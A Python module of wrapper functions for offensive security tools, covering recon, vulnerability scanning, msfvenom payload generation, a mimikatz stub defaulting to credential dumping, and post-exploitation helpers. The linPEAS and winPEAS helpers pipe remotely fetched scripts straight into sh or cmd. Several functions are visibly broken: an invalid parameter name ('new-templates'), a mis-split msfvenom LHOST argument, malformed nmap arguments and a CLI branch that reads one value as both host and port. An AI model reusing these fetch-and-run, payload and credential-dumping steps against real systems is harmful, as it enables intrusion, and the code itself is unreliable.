#!/usr/bin/env python3
"""
SecAIOS Tool Suite - Wrapper functions for common pentesting tools
Scan wrappers, utility functions, chain executors
"""

import json
import os
import subprocess
import re
import socket
from dataclasses import dataclass
from typing import Any, Optional

# ========================================
# RECON TOOLS
# ========================================

def run_amass(target: str, passive: bool = False, active: bool = False) -> dict:
    """Run Amass DNS enumeration"""
    cmd = ["amass", "enum"]
    
    if passive:
        cmd.extend(["-passive"])
    if active:
        cmd.extend(["-active", "-p", "80,443"])
    
    cmd.extend(["-d", target, "-o", f"/tmp/amass_{target}.txt"])
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    return {
        "tool": "amass",
        "target": target,
        "success": result.returncode == 0,
        "output": result.stdout,
        "file": f"/tmp/amass_{target}.txt"
    }


def run_theHarvester(target: str, sources: list = None) -> dict:
    """Run theHarvester email/OSINT discovery"""
    cmd = ["theHarvester", "-d", target, "-b", "all"]
    
    if sources:
        cmd = ["theHarvester", "-d", target, "-b", ",".join(sources)]
    
    # Suppress output
    cmd.extend(["-f", f"/tmp/harvester_{target}.json"])
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    return {
        "tool": "theHarvester",
        "target": target,
        "success": result.returncode == 0,
        "output": result.stdout,
        "json": f"/tmp/harvester_{target}.json"
    }


def run_subfinder(target: str) -> dict:
    """Run subfinder subdomain enumeration"""
    cmd = ["subfinder", "-d", target, "-o", f"/tmp/subfinder_{target}.txt"]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    # Parse output
    domains = []
    if result.returncode == 0:
        with open(f"/tmp/subfinder_{target}.txt") as f:
            domains = [line.strip() for line in f if line.strip()]
    
    return {
        "tool": "subfinder",
        "target": target,
        "found": len(domains),
        "subdomains": domains,
        "success": result.returncode == 0
    }


def run_httpx(targets: list) -> dict:
    """Run httpx HTTP probing"""
    # Create input file
    with open("/tmp/httpx_input.txt", "w") as f:
        f.write("\n".join(targets))
    
    cmd = ["httpx", "-list", "/tmp/httpx_input.txt", 
           "-threads", "50", "-silent", "-json"]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    # Parse JSON output
    results = []
    for line in result.stdout.split("\n"):
        if line.strip():
            try:
                results.append(json.loads(line))
            except:
                pass
    
    return {
        "tool": "httpx",
        "probed": len(targets),
        "alive": len(results),
        "results": results
    }


# ========================================
# ENUMERATION TOOLS  
# ========================================

def run_nmap(target: str, ports: str = "-", arguments: str = "-sV -sC -oA") -> dict:
    """Run nmap port scan"""
    output_file = f"/tmp/nmap_{target.replace('.', '_')}"
    
    cmd = ["nmap", "-p", ports, arguments, target, "-oA", output_file]
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
    
    # Parse grepable output
    services = []
    ports = re.findall(r"(\d+)/(\w+)\s+open\s+(\S+)\s+(\S+)", result.stdout)
    
    for port, proto, service, version in ports:
        services.append({
            "port": int(port),
            "protocol": proto,
            "service": service,
            "version": version if version != "null" else None
        })
    
    return {
        "tool": "nmap",
        "target": target,
        "services": services,
        "open_count": len(services),
        "raw": result.stdout[:5000]
    }


def run_nmap_service(target: str, port: int, arguments: str = "-sV") -> dict:
    """Detect service version"""
    cmd = ["nmap", "-p", str(port), arguments, target]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    # Extract version info
    version = None
    match = re.search(r"(\S+)\s+version\s+(\S+)", result.stdout)
    if match:
        version = match.group(2)
    
    return {
        "tool": "nmap",
        "target": target,
        "port": port,
        "version": version,
        "raw": result.stdout[:2000]
    }


def run_whatweb(target: str) -> dict:
    """Run whatweb technology fingerprinting"""
    cmd = ["whatweb", target, "--log-xml", f"/tmp/whatweb_{target}.xml"]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    # Parse results
    technologies = []
    for line in result.stdout.split("\n"):
        if target in line:
            match = re.findall(r"\[(\w+)\]", line)
            technologies.extend(match)
    
    return {
        "tool": "whatweb",
        "target": target,
        "technologies": list(set(technologies)),
        "raw": result.stdout[:3000]
    }


def run_wpscan(target: str, scan_type: str = "enumeration") -> dict:
    """Run WPScan WordPress scanner"""
    cmd = ["wpscan", "--url", target]
    
    if scan_type == "enumerate":
        cmd.extend(["--enumerate", "vp,vt,cb"])
    elif scan_type == "plugins":
        cmd.extend(["--enumerate", "vp"])
    elif scan_type == "themes":
        cmd.extend(["--enumerate", "vt"])
    elif scan_type == "users":
        cmd.extend(["--enumerate", "u"])
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    
    plugins = []
    themes = []
    users = []
    
    for line in result.stdout.split("\n"):
        if "vulnerable plugin" in line.lower():
            plugins.append(line.strip())
        if "vulnerable theme" in line.lower():
            themes.append(line.strip())
        if "[+] User" in line:
            users.append(line.strip())
    
    return {
        "tool": "wpscan",
        "target": target,
        "plugins": plugins,
        "themes": themes,
        "users": users,
        "raw": result.stdout[:5000]
    }


# ========================================
# VULNERABILITY TOOLS
# ========================================

def run_nuclei(target: str, severity: str = "critical,high,medium",
             new-templates: bool = False) -> dict:
    """Run Nuclei vulnerability scanner"""
    # Update templates if requested
    if new-templates:
        subprocess.run(["nuclei", "-ut"], capture_output=True)
    
    cmd = ["nuclei", "-u", target, 
           "-severity", severity,
           "-silent", "-json",
           "-o", f"/tmp/nuclei_{target}.json"]
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
    
    # Parse JSON output
    findings = []
    try:
        with open(f"/tmp/nuclei_{target}.json") as f:
            for line in f:
                if line.strip():
                    findings.append(json.loads(line))
    except:
        pass
    
    return {
        "tool": "nuclei",
        "target": target,
        "findings": len(findings),
        "items": findings,
        "severity": severity
    }


def run_nikto(target: str) -> dict:
    """Run Nikto web vulnerability scanner"""
    cmd = ["nikto", "-h", target, "-o", f"/tmp/nikto_{target}.txt"]
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
    
    # Parse findings
    vulns = []
    for line in result.stdout.split("\n"):
        if "+ " in line and ("vulnerability" in line.lower() or "error" in line.lower()):
            vulns.append(line.strip())
    
    return {
        "tool": "nikto",
        "target": target,
        "findings": len(vulns),
        "vulnerabilities": vulns[:20],
        "raw": result.stdout[:5000]
    }


def run_sqlmap(target: str, data: str = None) -> dict:
    """Run SQLMap SQL injection tester"""
    cmd = ["sqlmap", "-u", target, "--batch"]
    
    if data:
        cmd.extend(["--data", data])
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    
    # Check for injection points
    vulnerable = "vulnerable" in result.stdout.lower()
    
    return {
        "tool": "sqlmap",
        "target": target,
        "vulnerable": vulnerable,
        "output": result.stdout[:3000]
    }


def run_commix(target: str, data: str = None) -> dict:
    """Run Commix command injection tester"""
    cmd = ["commix", "--url", target]
    
    if data:
        cmd.extend(["--data", data])
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    
    vulnerable = "vulnerable" in result.stdout.lower() or "injection" in result.stdout.lower()
    
    return {
        "tool": "commix",
        "target": target,
        "vulnerable": vulnerable,
        "output": result.stdout[:3000]
    }


def run_gitleaks(path: str) -> dict:
    """Run gitleaks secret detection"""
    cmd = ["gitleaks", "detect", "--source", path, "-f", "json",
           "-o", f"/tmp/gitleaks_{os.path.basename(path)}.json"]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    secrets = []
    try:
        with open(f"/tmp/gitleaks_{os.path.basename(path)}.json") as f:
            secrets = json.load(f)
    except:
        pass
    
    return {
        "tool": "gitleaks",
        "path": path,
        "secrets_found": len(secrets),
        "secrets": secrets[:10]
    }


# ========================================
# EXPLOITATION TOOLS
# ========================================

def run_msfvenom(payload: str, lhost: str = None, lport: str = "4444",
              format: str = "exe", handler: bool = False) -> str:
    """Generate Metasploit payload"""
    cmd = ["msfvenom", "-p", payload]
    
    if lhost:
        cmd.extend(["LHOST=", lhost])
    if lport:
        cmd.extend(["LPORT=", lport])
    
    cmd.extend(["-f", format, "-o", f"/tmp/payload.{format}"])
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode == 0:
        return f"/tmp/payload.{format}"
    return None


def run_mimikatz(commands: list = None) -> dict:
    """Run mimikatz (Windows only)"""
    if commands is None:
        commands = ["privilege::debug", "sekurlsa::logonpasswords"]
    
    # This is a stub - mimikatz runs on Windows
    return {
        "tool": "mimikatz",
        "available": False,
        "note": "Run on Windows target with shell"
    }


# ========================================
# POST-EXPLOITATION TOOLS
# ========================================

def run_linpeas(output_file: str = "/tmp/linpeas.txt") -> dict:
    """Run linPEAS Linux privilege escalation scanner"""
    cmd = "curl -sL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linpeas.sh | sh"
    
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
    
    # Parse for vulnerabilities
    privesc_vectors = []
    
    privesc_patterns = [
        r"SUID",
        r"sudo",
        r"Capabilities",
        r"Cron",
        r"Kernel"
    ]
    
    for line in result.stdout.split("\n"):
        for pattern in privesc_patterns:
            if pattern in line.upper() and "[" in line:
                privesc_vectors.append(line.strip())
    
    return {
        "tool": "linpeas",
        "vectors": privesc_vectors[:20],
        "raw": result.stdout[:10000]
    }


def run_winpeas() -> dict:
    """Run winPEAS Windows privilege escalation"""
    cmd = "curl -sL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS.bat | cmd"
    
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
    
    return {
        "tool": "winpeas",
        "output": result.stdout[:10000]
    }


def run_pspy() -> dict:
    """Run pspy process monitor"""
    cmd = "curl -sL https://raw.githubusercontent.com/DominicBreuker/pspy/master/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy"
    subprocess.run(cmd, shell=True, capture_output=True)
    
    return {
        "tool": "pspy",
        "location": "/tmp/pspy",
        "note": "Run with: /tmp/pspy -f -c 'command'"
    }


# ========================================
# REPORTING TOOLS
# ========================================

def parse_nmap_xml(xml_file: str) -> dict:
    """Parse nmap XML output"""
    # Note: Use xmltodict or lxml in production
    return {"file": xml_file, "parsed": True}


def parse_nuclei_json(json_file: str) -> list:
    """Parse Nuclei JSON output"""
    findings = []
    try:
        with open(json_file) as f:
            for line in f:
                if line.strip():
                    findings.append(json.loads(line))
    except FileNotFoundError:
        pass
    return findings


def format_report_markdown(target: str, findings: list, services: list) -> str:
    """Format markdown report"""
    report = f"""# Penetration Test Report: {target}

## Summary
- Target: {target}
- Date: {__import__('datetime').datetime.now().strftime('%Y-%m-%d')}
- Findings: {len(findings)}
- Services: {len(services)}

## Findings
"""
    
    for i, f in enumerate(findings, 1):
        report += f"""
### {i}. {f.get('title', 'Unknown')}
**Severity**: {f.get('severity', 'medium')}
**Description**: {f.get('description', 'N/A')}
"""
    
    report += f"""
## Services
| Port | Service | Version |
|------|---------|---------|
"""
    
    for s in services:
        report += f"| {s.get('port')} | {s.get('service')} | {s.get('version', 'N/A')} |\n"
    
    report += """
## Recommendations
1. Patch critical vulnerabilities
2. Implement input validation
3. Enable logging
"""
    
    return report


# ========================================
# UTILITY FUNCTIONS
# ========================================

def check_port(host: str, port: int, timeout: int = 3) -> bool:
    """Check if port is open"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        result = sock.connect_ex((host, port))
        return result == 0
    except:
        return False
    finally:
        sock.close()


def resolve_hostname(hostname: str) -> str:
    """Resolve hostname to IP"""
    try:
        return socket.gethostbyname(hostname)
    except:
        return None


def get_banner(host: str, port: int) -> str:
    """Grab banner from service"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((host, port))
        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
        return sock.recv(1024).decode('utf-8', errors='ignore')
    except:
        return None
    finally:
        sock.close()


# ========================================
# MAIN CLI
# ========================================

def main():
    import sys
    
    if len(sys.argv) < 2:
        print("SecAIOS Tool Suite")
        print("Usage: python -m tools <tool> <target>")
        return
    
    tool = sys.argv[1]
    target = sys.argv[2] if len(sys.argv) > 2 else "localhost"
    
    if tool == "amass":
        print(json.dumps(run_amass(target), indent=2))
    elif tool == "subfinder":
        print(json.dumps(run_subfinder(target), indent=2))
    elif tool == "nmap":
        print(json.dumps(run_nmap(target), indent=2))
    elif tool == "whatweb":
        print(json.dumps(run_whatweb(target), indent=2))
    elif tool == "wpscan":
        print(json.dumps(run_wpscan(target), indent=2))
    elif tool == "nuclei":
        print(json.dumps(run_nuclei(target), indent=2))
    elif tool == "nikto":
        print(json.dumps(run_nikto(target), indent=2))
    elif tool == "linpeas":
        print(json.dumps(run_linpeas(), indent=2))
    elif tool == "check_port":
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
        print(f"Port {port}: {'open' if check_port(target, port) else 'closed'}")
    else:
        print(f"Unknown tool: {tool}")


if __name__ == "__main__":
    main()